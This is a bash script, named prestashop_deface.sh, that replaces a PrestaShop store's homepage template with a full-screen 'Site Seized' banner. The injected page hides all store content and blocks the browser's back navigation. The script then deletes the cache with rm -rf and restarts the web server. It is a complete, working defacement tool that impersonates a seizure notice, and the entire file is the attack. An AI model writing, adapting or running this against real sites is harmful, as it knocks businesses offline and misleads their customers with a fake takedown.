#!/usr/bin/env bash
set -euo pipefail

# Completely replaces index.tpl with seized banner only
# Usage: sudo bash prestashop_deface.sh

PRESTASHOP_ROOT="/var/www/prestashop"
THEME="classic"
IMAGE_NAME="seized_banner.png"

# colored logging
info(){ printf "\e[1;34m[INFO]\e[0m %s\n" "$*"; }
warn(){ printf "\e[1;33m[WARN]\e[0m %s\n" "$*"; }
err(){ printf "\e[1;31m[ERROR]\e[0m %s\n" "$*" >&2; }

# parse args
while [ $# -gt 0 ]; do
  case "$1" in
    --root) PRESTASHOP_ROOT="$2"; shift 2;;
    --theme) THEME="$2"; shift 2;;
    -h|--help) printf "Usage: %s [--root ROOT] [--theme THEME]\n" "$0"; exit 0;;
    *) err "Unknown arg: $1"; exit 1;;
  esac
done

# sudo wrapper
if [ "$(id -u)" -ne 0 ]; then
  SUDO="sudo"
else
  SUDO=""
fi

TEMPLATE_DIR="${PRESTASHOP_ROOT}/themes/${THEME}/templates"
TARGET="${TEMPLATE_DIR}/index.tpl"
BACKUP="${TARGET}.aperture.backup"
IMAGE_PATH="${PRESTASHOP_ROOT}/img/${IMAGE_NAME}"

info "PrestaShop root: ${PRESTASHOP_ROOT}"
info "Theme: ${THEME}"
info "Target template: ${TARGET}"
info "Image: ${IMAGE_PATH}"
echo

# validate
if ! ${SUDO} test -d "${TEMPLATE_DIR}"; then
  err "Template directory not found: ${TEMPLATE_DIR}"
  exit 2
fi

if ! ${SUDO} test -f "${TARGET}"; then
  err "index.tpl not found at ${TARGET}"
  exit 3
fi

if ! ${SUDO} test -f "${IMAGE_PATH}"; then
  err "Seizure image not found at ${IMAGE_PATH}"
  err "Upload it with: scp images/${IMAGE_NAME} user@host:/tmp/ && ssh user@host \"sudo mv /tmp/${IMAGE_NAME} ${IMAGE_PATH}\""
  exit 4
fi

# backup original (only if backup doesn't exist)
if ! ${SUDO} test -f "${BACKUP}"; then
  info "Creating backup: ${BACKUP}"
  ${SUDO} cp "${TARGET}" "${BACKUP}"
else
  info "Backup already exists: ${BACKUP}"
fi

# create completely new seized template
info "Creating seized template..."
${SUDO} tee "${TARGET}" > /dev/null << 'SEIZED_TEMPLATE'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Seized</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html, body {
            height: 100%;
            overflow: hidden;
        }
        
        body {
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
        }
        
        .seized-container {
            text-align: center;
            max-width: 90vw;
            max-height: 90vh;
        }
        
        .seized-banner {
            max-width: 100%;
            max-height: 100vh;
            width: auto;
            height: auto;
            display: block;
            margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="seized-container">
        <img src="/img/seized_banner.png" alt="Site Seized" class="seized-banner" />
    </div>
    
    <script>
        // Prevent any other content from loading
        document.addEventListener('DOMContentLoaded', function() {
            // Hide any PrestaShop elements that might load
            const psElements = document.querySelectorAll('[id*="prestashop"], [class*="prestashop"], header, nav, footer, .header, .footer');
            psElements.forEach(el => el.style.display = 'none');
        });
        
        // Prevent back navigation
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
        };
    </script>
</body>
</html>
SEIZED_TEMPLATE

# preserve original ownership and permissions
info "Setting permissions..."
${SUDO} chown --reference="${BACKUP}" "${TARGET}" 2>/dev/null || true
${SUDO} chmod --reference="${BACKUP}" "${TARGET}" 2>/dev/null || true

# clear cache
CACHE_DIR="${PRESTASHOP_ROOT}/var/cache"
if ${SUDO} test -d "${CACHE_DIR}"; then
  info "Clearing PrestaShop cache..."
  ${SUDO} rm -rf "${CACHE_DIR}"/* || true
  ${SUDO} mkdir -p "${CACHE_DIR}" || true
  ${SUDO} chown --reference="${PRESTASHOP_ROOT}" "${CACHE_DIR}" 2>/dev/null || true
fi

# restart web server
info "Restarting web server..."
if ${SUDO} systemctl --quiet is-active apache2 >/dev/null 2>&1; then
  ${SUDO} systemctl restart apache2
  info "Apache2 restarted"
elif ${SUDO} systemctl --quiet is-active httpd >/dev/null 2>&1; then
  ${SUDO} systemctl restart httpd
  info "HTTP restarted"
elif ${SUDO} systemctl --quiet is-active nginx >/dev/null 2>&1; then
  ${SUDO} systemctl restart nginx
  info "Nginx restarted"
elif ${SUDO} command -v service >/dev/null 2>&1; then
  ${SUDO} service apache2 restart 2>/dev/null || ${SUDO} service httpd restart 2>/dev/null || ${SUDO} service nginx restart 2>/dev/null || true
  info "Service restart attempted"
else
  warn "Could not detect/restart web server"
fi

info ""
info "SUCCESS: Website seized!"
info " - Original template backed up to: ${BACKUP}"
info " - Seized template installed at: ${TARGET}"
info " - Only the seized banner will display"
echo
